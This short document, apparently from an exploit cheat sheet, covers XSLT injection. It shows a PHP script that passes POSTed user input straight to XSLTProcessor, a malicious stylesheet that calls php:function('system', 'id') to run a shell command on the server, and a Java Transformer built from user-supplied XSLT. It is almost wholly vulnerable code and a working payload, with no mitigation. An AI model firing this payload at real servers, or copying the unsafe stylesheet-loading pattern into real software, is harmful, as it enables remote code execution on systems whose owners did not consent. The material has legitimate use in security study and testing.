
## PHP + libxslt Exploit

```php
<?php
$xml = new DOMDocument();
$xml->loadXML('<root>test</root>');

$xsl = new DOMDocument();
$xsl->loadXML($_POST['xslt']); // User-controlled input!

$proc = new XSLTProcessor();
$proc->importStyleSheet($xsl);
echo $proc->transformToXML($xml);
?>
```

### Malicious XSLT
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## Java Example

```
TransformerFactory factory = TransformerFactory.newInstance();
Transformer transformer = factory.newTransformer(new StreamSource(userInputXslt));
transformer.transform(new StreamSource(xmlInput), new StreamResult(output));
```